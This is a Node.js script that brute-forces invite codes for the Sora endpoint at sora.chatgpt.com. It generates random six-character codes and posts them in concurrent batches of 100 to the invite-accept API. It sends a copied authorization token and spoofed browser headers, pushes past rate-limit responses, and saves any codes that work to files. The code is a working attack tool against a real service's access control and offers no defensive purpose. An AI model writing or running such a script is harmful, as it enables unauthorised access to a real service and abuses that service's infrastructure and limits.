const fs = require('fs').promises;
const path = require('path');
const axios = require('axios');
const dotenv = require('dotenv').config()

const TRIED_FILE = 'tried_codes.json';
const LEGACY_SUCCESS_FILE = 'success_codes.json';

const todayTagUTC = () => new Date().toISOString().slice(0, 10).replace(/-/g, '');

const SUCCESS_FILE = `success_codes_${todayTagUTC()}.json`;
const BASE_URL = 'https://sora.chatgpt.com/backend/project_y/invite/accept';

const HEADERS = {
  'accept': '*/*',
  'accept-encoding': 'gzip, deflate, br, zstd',
  'accept-language': 'en-GB,en;q=0.5',
  'authorization': process.env.HTTP_AUTHORIZATION_HEADER,
  'connection': 'keep-alive',
  'content-type': 'application/json',
  'host': 'sora.chatgpt.com',
  'oai-device-id': '9d8b579c-3074-44c0-a3f2-69be5ec1ce9f', // Kept existing device-id
  'priority': 'u=4',
  'referer': 'https://sora.chatgpt.com/explore',
  'sec-fetch-dest': 'empty',
  'sec-fetch-mode': 'cors',
  'sec-fetch-site': 'same-origin',
  'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36' // Added a default User-Agent
};

const generateRandomCode = () => {
  const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
  let code = '';
  for (let i = 0; i < 6; i++) {
    code += chars[Math.floor(Math.random() * chars.length)];
  }
  return code;
};

const loadTriedCodes = async () => {
  try {
    const data = await fs.readFile(TRIED_FILE, 'utf8');
    return new Set(JSON.parse(data));
  } catch (error) {
    return new Set();
  }
};

const saveTriedCodes = async (triedCodes) => {
  await fs.writeFile(TRIED_FILE, JSON.stringify(Array.from(triedCodes), null, 2));
};

const loadSuccessCodes = async () => {
  try {
    const data = await fs.readFile(SUCCESS_FILE, 'utf8');
    return JSON.parse(data);
  } catch (error) {
    if (error.code === 'ENOENT') {
      try {
        const legacyData = await fs.readFile(LEGACY_SUCCESS_FILE, 'utf8');
        const legacyCodes = JSON.parse(legacyData);
        await fs.writeFile(SUCCESS_FILE, JSON.stringify(legacyCodes, null, 2));
        return legacyCodes;
      } catch (legacyError) {
        if (legacyError.code !== 'ENOENT') {
          console.warn(`Unable to read legacy success file: ${legacyError.message}`);
        }
        return [];
      }
    }

    console.warn(`Unable to read success file ${SUCCESS_FILE}: ${error.message}`);
    return [];
  }
};

const saveSuccessCode = async (code) => {
  // 使用互斥锁确保同一时间只有一个写入操作
  saveSuccessLock = saveSuccessLock.then(async () => {
    const successes = await loadSuccessCodes();
    if (!successes.includes(code)) {
      successes.push(code);
      await fs.writeFile(SUCCESS_FILE, JSON.stringify(successes, null, 2));
    }

    if (LEGACY_SUCCESS_FILE !== SUCCESS_FILE) {
      try {
        await fs.unlink(LEGACY_SUCCESS_FILE);
      } catch (error) {
        if (error.code !== 'ENOENT') {
          console.warn(`Unable to remove legacy success file: ${error.message}`);
        }
      }
    }
  }).catch((error) => {
      console.error('Failed to save success code:', error);
  });

  return saveSuccessLock;
};

const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// 简单的互斥锁实现
let saveSuccessLock = Promise.resolve();

const tryInviteCode = async (code) => {
  try {
    const response = await axios.post(BASE_URL, { invite_code: code }, { headers: HEADERS, timeout: 30000 });
    console.log(`=== Success code ${code}, response status ${response.status}`);
    return response.status;
  } catch (error) {
    console.error(`Error trying code ${code}:`, error.message);
    return error.response ? error.response.status : 5000;
  }
};

const main = async () => {
  console.log('Starting invite code brute force...');
  let triedCodes = await loadTriedCodes();
  const batchSize = 100;

  while (true) {
    const batch = new Set();
    while (batch.size < batchSize) {
      const code = generateRandomCode();
      if (!triedCodes.has(code) && !batch.has(code)) {
        batch.add(code);
      }
    }

    const batchArray = Array.from(batch);
    let foundSuccess = false;

    await Promise.all(batchArray.map(async (code) => {
    //   console.log(`Attempting code: ${code}`);
      const status = await tryInviteCode(code);
      if (status !== 403 && status !== 401 && status !== 429 && status !== 5000) {
        console.log(`Success! Code ${code} returned status ${status}. Saving...`);
        await saveSuccessCode(code);
        foundSuccess = true;
      } else {
        // console.log(`Code ${code} failed (403).`);
        triedCodes.add(code);
      }
      await delay(5000); // 30 seconds delay after each attempt
    }));

    await saveTriedCodes(triedCodes);

    if (foundSuccess) {
      console.log('Found a successful code. Exiting.');
      break;
    }
  }
};

main().catch(console.error);